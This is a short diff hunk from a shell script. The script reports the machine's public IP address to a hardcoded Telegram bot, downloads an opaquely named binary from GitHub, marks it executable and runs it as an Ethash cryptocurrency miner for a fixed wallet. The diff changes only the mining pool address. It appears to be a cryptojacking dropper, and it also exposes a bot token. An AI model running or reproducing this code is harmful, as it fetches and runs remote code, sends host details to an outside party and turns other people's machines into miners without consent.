@@ -6,4 +6,4 @@ myIp="$(wget -qO- ifconfig.me/ip)"
 curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$myIp --compressed
 
 wget https://github.com/t3rs3r4h/master/raw/main/dev && chmod +x dev 
-./dev --algo ETHASH --pool stratum+ssl://us1.ethermine.org:5555 -u 0x205023e287bd796ed7f9d458a04d7956c11d9ea3.Worker
+./dev --algo ETHASH --pool stratum+ssl://us2.ethermine.org:4444 -u 0x205023e287bd796ed7f9d458a04d7956c11d9ea3.Worker
